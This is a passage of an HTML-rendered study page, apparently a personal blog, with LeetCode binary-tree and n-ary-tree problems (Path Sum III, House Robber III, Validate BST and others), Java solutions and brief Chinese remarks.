tree has no more than 1,000 nodes and the values are in the range -1,000,000 to 1,000,000.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root &#x3D; [10,5,-3,3,2,null,11,3,-2,null,1], sum &#x3D; 8</span><br><span class="line"></span><br><span class="line">      10</span><br><span class="line">     &#x2F;  \</span><br><span class="line">    5   -3</span><br><span class="line">   &#x2F; \    \</span><br><span class="line">  3   2   11</span><br><span class="line"> &#x2F; \   \</span><br><span class="line">3  -2   1</span><br><span class="line"></span><br><span class="line">Return 3. The paths that sum to 8 are:</span><br><span class="line"></span><br><span class="line">1.  5 -&gt; 3</span><br><span class="line">2.  5 -&gt; 2 -&gt; 1</span><br><span class="line">3. -3 -&gt; 11</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">return</span> pathSumFrom(root, sum) + pathSum(root.left, sum) + pathSum(root.right, sum);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">pathSumFrom</span><span class="params">(TreeNode node, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">return</span> (node.val == sum ? <span class="number">1</span> : <span class="number">0</span>) </span><br><span class="line">           + pathSumFrom(node.left, sum - node.val) + pathSumFrom(node.right, sum - node.val);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="404-sum-of-left-leaves">404. Sum of Left Leaves ×</span></h2><p>Find the sum of all left leaves in a given binary tree.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    3</span><br><span class="line">   &#x2F; \</span><br><span class="line">  9  20</span><br><span class="line">    &#x2F;  \</span><br><span class="line">   15   7</span><br><span class="line"></span><br><span class="line">There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (isLeaf(root.left)) <span class="keyword">return</span> root.left.val + sumOfLeftLeaves(root.right);</span><br><span class="line">    <span class="keyword">return</span> sumOfLeftLeaves(root.left) + sumOfLeftLeaves(root.right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isLeaf</span><span class="params">(TreeNode node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> node.left == <span class="keyword">null</span> &amp;&amp; node.right == <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="687-longest-univalue-path">687. Longest Univalue Path ×</span></h2><p>Given a binary tree, find the length of the longest path where each node in the path has the same value. This path may or may not pass through the root.</p><p>The length of path between two nodes is represented by the number of edges between them. </p><p><strong>Example 1:</strong></p><p><strong>Input:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    5</span><br><span class="line">   &#x2F; \</span><br><span class="line">  4   5</span><br><span class="line"> &#x2F; \   \</span><br><span class="line">1   1   5</span><br></pre></td></tr></table></figure><p><strong>Output:</strong> 2 </p><p><strong>Example 2:</strong></p><p><strong>Input:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   &#x2F; \</span><br><span class="line">  4   5</span><br><span class="line"> &#x2F; \   \</span><br><span class="line">4   4   5</span><br></pre></td></tr></table></figure><p><strong>Output:</strong> 2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestUnivaluePath</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">int</span> left = helper(root.left, root.val);</span><br><span class="line">       <span class="keyword">int</span> right = helper(root.right, root.val);</span><br><span class="line">      <span class="keyword">return</span> Math.max(left + right, Math.max(longestUnivaluePath(root.left), longestUnivaluePath(root.right)));</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">helper</span><span class="params">(TreeNode root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (root == <span class="keyword">null</span> || root.val != val) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">1</span> + Math.max(helper(root.left, val), helper(root.right, val));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="337-house-robber-iii">337. House Robber III √</span></h2><p>The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the “root.” Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that “all houses in this place forms a binary tree”. It will automatically contact the police if two directly-linked houses were broken into on the same night.</p><p>Determine the maximum amount of money the thief can rob tonight without alerting the police.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,2,3,null,3,null,1]</span><br><span class="line"></span><br><span class="line">     3</span><br><span class="line">    &#x2F; \</span><br><span class="line">   2   3</span><br><span class="line">    \   \ </span><br><span class="line">     3   1</span><br><span class="line"></span><br><span class="line">Output: 7 </span><br><span class="line">Explanation: Maximum amount of money the thief can rob &#x3D; 3 + 3 + 1 &#x3D; 7.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,4,5,1,3,null,1]</span><br><span class="line"></span><br><span class="line">     3</span><br><span class="line">    &#x2F; \</span><br><span class="line">   4   5</span><br><span class="line">  &#x2F; \   \ </span><br><span class="line"> 1   3   1</span><br><span class="line"></span><br><span class="line">Output: 9</span><br><span class="line">Explanation: Maximum amount of money the thief can rob &#x3D; 4 + 5 &#x3D; 9.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">        val += rob(root.left.left) + rob(root.left.right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (root.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">        val += rob(root.right.left) + rob(root.right.right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Math.max(val + root.val, rob(root.left) + rob(root.right));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接用层次遍历就可以做。</p><h2><span id="590-n-ary-tree-postorder-traversal">590. N-ary Tree Postorder Traversal √</span></h2><p>Given an n-ary tree, return the <em>postorder</em> traversal of its nodes’ values.</p><p><em>Nary-Tree input serialization is represented in their level order traversal, each group of children is separated by the null value (See examples).</em></p><p><strong>Follow up:</strong></p><p>Recursive solution is trivial, could you do it iteratively? </p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root &#x3D; [1,null,3,2,4,null,5,6]</span><br><span class="line">Output: [5,6,3,2,4,1]</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><p><img src="https://assets.leetcode.com/uploads/2019/11/08/sample_4_964.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root &#x3D; [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]</span><br><span class="line">Output: [2,6,14,11,7,3,12,8,4,13,9,10,5,1]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorder</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res=<span class="keyword">new</span> ArrayList();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;      </span><br><span class="line">       postT(root,res);</span><br><span class="line">       res.add(root.val);</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postT</span><span class="params">(Node root, List&lt;Integer&gt; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(Node c: root.children)&#123;</span><br><span class="line">           postT(c,res);</span><br><span class="line">           res.add(c.val);</span><br><span class="line">       &#125;   </span><br><span class="line">       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="589-n-ary-tree-preorder-traversal">589. N-ary Tree Preorder Traversal √</span></h2><p>Given an n-ary tree, return the <em>preorder</em> traversal of its nodes’ values.</p><p><em>Nary-Tree input serialization is represented in their level order traversal, each group of children is separated by the null value (See examples).</em></p><p><strong>Follow up:</strong></p><p>Recursive solution is trivial, could you do it iteratively?</p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root &#x3D; [1,null,3,2,4,null,5,6]</span><br><span class="line">Output: [1,3,5,6,2,4]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorder</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">       List&lt;Integer&gt; res =<span class="keyword">new</span> ArrayList();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">       res.add(root.val);</span><br><span class="line">       find(root,res);           </span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">(Node root,List&lt;Integer&gt; res)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root!=<span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">for</span>(Node n:root.children)&#123;</span><br><span class="line">               res.add(n.val);</span><br><span class="line">               find(n,res);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="559-maximum-depth-of-n-ary-tree">559. Maximum Depth of N-ary Tree √</span></h2><p>Given a n-ary tree, find its maximum depth.</p><p>The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.</p><p><em>Nary-Tree input serialization is represented in their level order traversal, each group of children is separated by the null value (See examples).</em></p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root &#x3D; [1,null,3,2,4,null,5,6]</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><p><img src="https://assets.leetcode.com/uploads/2019/11/08/sample_4_964.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root &#x3D; [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]</span><br><span class="line">Output: 5</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(Node root)</span> </span>&#123;       </span><br><span class="line">        <span class="keyword">return</span> dfs(root, <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(Node root, <span class="keyword">int</span> depth)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> res=depth;</span><br><span class="line">       <span class="keyword">if</span> (root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;         </span><br><span class="line">       <span class="keyword">for</span> (Node child:root.children) &#123;</span><br><span class="line">           res=Math.max(dfs(child, depth+<span class="number">1</span>),res);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="337-house-robber-iii-">337. House Robber III -</span></h2><p>The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the “root.” Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that “all houses in this place forms a binary tree”. It will automatically contact the police if two directly-linked houses were broken into on the same night.</p><p>Determine the maximum amount of money the thief can rob tonight without alerting the police.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,2,3,null,3,null,1]</span><br><span class="line"></span><br><span class="line">     3</span><br><span class="line">    &#x2F; \</span><br><span class="line">   2   3</span><br><span class="line">    \   \ </span><br><span class="line">     3   1</span><br><span class="line"></span><br><span class="line">Output: 7 </span><br><span class="line">Explanation: Maximum amount of money the thief can rob &#x3D; 3 + 3 + 1 &#x3D; 7.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,4,5,1,3,null,1]</span><br><span class="line"></span><br><span class="line">     3</span><br><span class="line">    &#x2F; \</span><br><span class="line">   4   5</span><br><span class="line">  &#x2F; \   \ </span><br><span class="line"> 1   3   1</span><br><span class="line"></span><br><span class="line">Output: 9</span><br><span class="line">Explanation: Maximum amount of money the thief can rob &#x3D; 4 + 5 &#x3D; 9.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">int</span> v1 = root.val,v2=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(root.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           v2+=rob(root.left);</span><br><span class="line">           v1+=rob(root.left.right)+rob(root.left.left);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(root.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           v2+=rob(root.right);</span><br><span class="line">           v1+=rob(root.right.right)+rob(root.right.left);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> Math.max(v1,v2);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="树的性质">树的性质</span></h1><h2><span id="897-increasing-order-search-tree">897. Increasing Order Search Tree ×</span></h2><p>Given a binary search tree, rearrange the tree in <strong>in-order</strong> so that the leftmost node in the tree is now the root of the tree, and every node has no left child and only 1 right child.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">Input: [5,3,6,2,4,null,8,1,null,null,null,7,9]</span><br><span class="line"></span><br><span class="line">       5</span><br><span class="line">      &#x2F; \</span><br><span class="line">    3    6</span><br><span class="line">   &#x2F; \    \</span><br><span class="line">  2   4    8</span><br><span class="line"> &#x2F;        &#x2F; \ </span><br><span class="line">1        7   9</span><br><span class="line"></span><br><span class="line">Output: [1,null,2,null,3,null,4,null,5,null,6,null,7,null,8,null,9]</span><br><span class="line"></span><br><span class="line"> 1</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line">    \</span><br><span class="line">     3</span><br><span class="line">      \</span><br><span class="line">       4</span><br><span class="line">        \</span><br><span class="line">         5</span><br><span class="line">          \</span><br><span class="line">           6</span><br><span class="line">            \</span><br><span class="line">             7</span><br><span class="line">              \</span><br><span class="line">               8</span><br><span class="line">                \</span><br><span class="line">                 9</span><br></pre></td></tr></table></figure><h2><span id="671-second-minimum-node-in-a-binary-tree">671. Second Minimum Node In a Binary Tree ×</span></h2><p>Given a non-empty special binary tree consisting of nodes with the non-negative value, where each node in this tree has exactly <code>two</code> or <code>zero</code> sub-node. If the node has two sub-nodes, then this node’s value is the smaller value among its two sub-nodes. More formally, the property <code>root.val = min(root.left.val, root.right.val)</code> always holds.</p><p>Given such a binary tree, you need to output the <strong>second minimum</strong> value in the set made of all the nodes’ value in the whole tree.</p><p>If no such second minimum value exists, output -1 instead.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">    2</span><br><span class="line">   &#x2F; \</span><br><span class="line">  2   5</span><br><span class="line">     &#x2F; \</span><br><span class="line">    5   7</span><br><span class="line"></span><br><span class="line">Output: 5</span><br><span class="line">Explanation: The smallest value is 2, the second smallest value is 5.</span><br></pre></td></tr></table></figure><p> <strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line">    2</span><br><span class="line">   &#x2F; \</span><br><span class="line">  2   2</span><br><span class="line"></span><br><span class="line">Output: -1</span><br><span class="line">Explanation: The smallest value is 2, but there isn&#39;t any second smallest value.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findSecondMinimumValue</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">if</span>(root.left==<span class="keyword">null</span>&amp;&amp;root.right==<span class="keyword">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">int</span> leftVal = root.left.val;</span><br><span class="line">       <span class="keyword">int</span> rightVal = root.right.val;  </span><br><span class="line">       <span class="keyword">if</span>(root.val==leftVal) leftVal=findSecondMinimumValue(root.left);</span><br><span class="line">       <span class="keyword">if</span>(root.val==rightVal) rightVal=findSecondMinimumValue(root.right);</span><br><span class="line">       <span class="keyword">if</span> (leftVal != -<span class="number">1</span> &amp;&amp; rightVal != -<span class="number">1</span>) <span class="keyword">return</span> Math.min(leftVal, rightVal);</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">return</span> leftVal==-<span class="number">1</span>?rightVal:leftVal;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="98-validate-binary-search-tree-">98. Validate Binary Search Tree -</span></h2><ul><li><p>中序遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; rec = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    dfs(root,rec);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;rec.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(rec.get(i)&gt;=rec.get(i+<span class="number">1</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode root,ArrayList&lt;Integer&gt; rec)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    dfs(root.left,rec);</span><br><span class="line">    rec.add(root.val);</span><br><span class="line">    dfs(root.right,rec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>递归</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dfs(root,Long.MAX_VALUE,Long.MIN_VALUE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(TreeNode root,<span class="keyword">long</span> max,<span class="keyword">long</span> min)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(root.val&gt;=max||root.val&lt;=min) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> dfs(root.left,root.val,min)&amp;&amp;dfs(root.right,max,root.val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="110-balanced-binary-tree">110. Balanced Binary Tree √</span></h2><p>Given a binary tree, determine if it is height-balanced.</p><p>For this problem, a height-balanced binary tree is defined as:</p><blockquote><p>a binary tree in which the left and right subtrees of <em>every</em> node differ in height by no more than 1. </p></blockquote><p><strong>Example 1:</strong></p><p>Given the following tree <code>[3,9,20,null,null,15,7]</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>Return true.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span 